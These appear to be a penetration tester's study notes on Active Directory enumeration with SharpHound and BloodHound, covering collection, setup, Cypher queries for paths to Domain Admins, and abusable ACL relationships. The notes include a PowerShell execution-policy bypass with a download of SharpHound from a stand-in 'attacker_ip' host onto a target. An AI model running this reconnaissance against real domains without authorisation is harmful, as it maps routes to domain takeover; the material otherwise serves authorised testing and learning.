# BloodHound

`BloodHound`  = automated AD enumeration tool 

Simple Enumeration Workflow
1. Collect domain data using `SharpHound`  
2. Analyze the data using `BloodHound`  

Pentest Workflow 
1. Confirm domain context manually.  
2. Collect SharpHound data.  
3. Import into BloodHound.  
4. Look for paths from current user/computer.  
5. Prioritize simple paths:  
		- local admin access  
		- sessions  
		- ACL abuse  
		- group membership  
		- Kerberoastable users  
6. Manually validate the finding.  
7. Exploit only after confirming the path.  
8. Document commands, graph path, and proof.

## SharpHound

- tries to find logged-on users / active sessions on remote hosts  
- may use Windows APIs:  
- `NetWkstaUserEnum`  
- `NetSessionEnum`  
- may also query Remote Registry if available

```bash
└─$ wget https://github.com/SpecterOps/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip

└─$ unzip SharpHound-v1.1.0.zip
└─$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

```bash
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .  
└─$ pwd    
/home/exploits
└─$ python3 -m http.server 80  
```

```powershell
# move Sharphound Kali -> Win 
powershell -ep bypass  

iwr -uri http://attacker_ip/enum/SharpHound.ps1 -outfile SharpHound.ps1

Import-Module ./Sharphound.ps1

# enum command
# perform ALL collection methods except for local group policies  
# default: gather data in JSON files + zip for us to transfer to kali  
Invoke-BloodHound -CollectionMethod All -OutputPrefix "audit"

# enum with output directory specified
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\current_user\Desktop\ -OutputPrefix "audit"
```

```powershell
Get-Help Invoke-BloodHound  
  
NAME  
    Invoke-BloodHound  
  
SYNOPSIS  
    Runs the BloodHound C# Ingestor using reflection. The assembly is stored in this file.  
  
  
SYNTAX  
    Invoke-BloodHound [-CollectionMethods <String[]>] [-Domain <String>] [-SearchForest] [-Stealth] [-LdapFilter  
    <String>] [-DistinguishedName <String>] [-ComputerFile <String>] [-OutputDirectory <String>] [-OutputPrefix  
    <String>] [-CacheName <String>] [-MemCache] [-RebuildCache] [-RandomFilenames] [-ZipFilename <String>] [-NoZip]  
    [-ZipPassword <String>] [-TrackComputerCalls] [-PrettyPrint] [-LdapUsername <String>] [-LdapPassword <String>]  
    [-DomainController <String>] [-LdapPort <Int32>] [-SecureLdap] [-DisableCertVerification] [-DisableSigning]  
    [-SkipPortCheck] [-PortCheckTimeout <Int32>] [-SkipPasswordCheck] [-ExcludeDCs] [-Throttle <Int32>] [-Jitter  
    <Int32>] [-Threads <Int32>] [-SkipRegistryLoggedOn] [-OverrideUsername <String>] [-RealDNSName <String>]  
    [-CollectAllProperties] [-Loop] [-LoopDuration <String>] [-LoopInterval <String>] [-StatusInterval <Int32>]  
    [-Verbosity <Int32>] [-Help] [-Version] [<CommonParameters>]  
  
DESCRIPTION  
    Using reflection and assembly.load, load the compiled BloodHound C# ingestor into memory  
    and run it without touching disk. Parameters are converted to the equivalent CLI arguments  
    for the SharpHound executable and passed in via reflection. The appropriate function  
    calls are made in order to ensure that assembly dependencies are loaded properly.  
  
  
RELATED LINKS  
  
REMARKS  
    To see the examples, type: "get-help Invoke-BloodHound -examples".  
    For more information, type: "get-help Invoke-BloodHound -detailed".  
    For technical information, type: "get-help Invoke-BloodHound -full".  
``` 

|Collection Method|Use|
|---|---|
|`All`|Broad collection; useful in labs|
|`Default`|Standard collection|
|`Session`|Find logged-on user sessions|
|`LocalAdmin`|Find local admin relationships|
|`ACL`|Find object control / rights|
|`Trusts`|Enumerate domain trust relationships|
|`Group`|Group membership relationships|
|`ComputerOnly`|Computer-focused collection|
|`DCOnly`|Domain controller-focused collection|

## BloodHound

Bloodhound Startup  = Docker OR Neo4j

Docker startup
```bash
└─$ docker compose up -d

└─$ cat /home/path/to/.config/bloodhound/bloodhound.config.json

{
  "bind_addr": "0.0.0.0:8080",
  "collectors_base_path": "/etc/bloodhound/collectors",
  "config_directory": "/home/path/to/.config/bloodhound",
  "default_admin": {
    "password": "REDACTED_DEFAULT_PW",
    "principal_name": "bloodhound_admin"
  },
  "default_password": "REDACTED_DEFAULT_PW",
	###
  "log_path": "bloodhound.log",
	###
  "recreatedefaultadmin": "false",
  "root_url": "http://127.0.0.1:8080", 
	 ### 
  "work_dir": "/opt/bloodhound/work"
}  
# open bloodhound at http://127.0.0.1:8080

└─$ pwd       
/home/path/to/.config/bloodhound

# Restart if needed:
└─$ docker compose down                                 
[+] down 4/4
 ✔ Container bloodhound-bloodhound-1 Removed                                                                    0.0s
 ✔ Container bloodhound-graph-db-1   Removed                                                                    0.0s
 ✔ Container bloodhound-app-db-1     Removed                                                                    0.4s
 ✔ Network bloodhound_default        Removed                                                                    0.3s

# If resetting the default admin is required in a lab:
└─$ bhe_recreate_default_admin=true docker compose up -d
[+] up 4/4
 ✔ Network bloodhound_default        Created                                                                   0.1ss
 ✔ Container bloodhound-graph-db-1   Healthy                                                                   16.2s
 ✔ Container bloodhound-app-db-1     Healthy                                                                   6.2ss
 ✔ Container bloodhound-bloodhound-1 Started                                                                   16.3s
```

neo4j startup
```bash  
└─$ sudo neo4j start      
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:761627). It is available at http://localhost:7474

# neo4j service running 
# open at http://localhost:7474
```  

Import Data
1. Open BloodHound.
2. Authenticate.
3. Upload the SharpHound `.zip` output.
4. Wait for ingestion.
5. Start with built-in queries.
6. Use custom Cypher queries for focused checks.

High-value questions:
- Find all Domain Admins
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Find Computers where Domain Users are Local Admin
- Find Users with Foreign Domain Group Membership
- Find Kerberoastable Users
- Find AS-REP Roastable Users
- Find Local Admin Access for current user
- Find Sessions for high-value users

Cypher = query language used to query the graph

|Part|Meaning|
|---|---|
|`MATCH`|Select graph patterns|
|`(node:Label)`|Select nodes with a specific label|
|`RETURN`|Return/display matching data|
|`p`|Often used to store a path|
|`[:RELATIONSHIP]`|Match a relationship type between nodes|
Display Computers
```cypher  
MATCH (m:Computer) RETURN m  
```  
- `m` : contain all object in db with property Computer  

Display user accounts on domain  
```cypher  
MATCH (m:User) RETURN m  
```  

Review Active Sessions
```cypher
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

|Part|Meaning|
|---|---|
|`(c:Computer)`|Computer node|
|`[:HasSession]`|Active session relationship|
|`(m:User)`|User node|
|`p`|Path variable for graph display|
Find Computers with Sessions
```cypher
MATCH (c:Computer)-[:HasSession]->(u:User)  
RETURN c.name, u.name
```

 Find Users with Admin Rights on Computers
```cypher
MATCH p = (u:User)-[:AdminTo]->(c:Computer)  
RETURN p
```

Find Group Membership Paths
```cypher
MATCH p = (u:User)-[:MemberOf*1..]->(g:Group)
RETURN p
```

Find Paths to Domain Admins
```cypher
MATCH p = shortestPath((n)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN p
```

| Finding               | Use                                      | Manual Validation                     |
| --------------------- | ---------------------------------------- | ------------------------------------- |
| `AdminTo`             | User/group has local admin on a computer | Test SMB/WinRM/admin access carefully |
| `HasSession`          | User has active session on a host        | Confirm host reachability and access  |
| `MemberOf`            | Nested group membership path             | Validate with LDAP/PowerView          |
| `GenericAll`          | Full control over object                 | Validate ACLs before abuse            |
| `GenericWrite`        | Can modify object attributes             | Validate possible abuse path          |
| `WriteDacl`           | Can modify object ACL                    | Confirm control path                  |
| `AddMember`           | Can add user to group                    | Check group impact                    |
| `ForceChangePassword` | Can reset another user’s password        | Confirm scope and consequences        |
| `DCSync`              | Can replicate directory secrets          | Very high impact; validate carefully  |

Record for each useful path: 
```text
Current user:
Current host:
Target object:
Relationship:
BloodHound path:
Manual validation:
Exploit idea:
Risk / caveat:
Result:
```

e.g. 
```text
Current user: domain.local\alice
Current host: workstation01
Target object: Helpdesk Operators
Relationship: AddMember
BloodHound path: alice -> AddMember -> Helpdesk Operators
Manual validation: PowerView confirms ACL
Exploit idea: Add controlled user to group
Risk / caveat: Group membership change is noisy
Result: pending validation
```

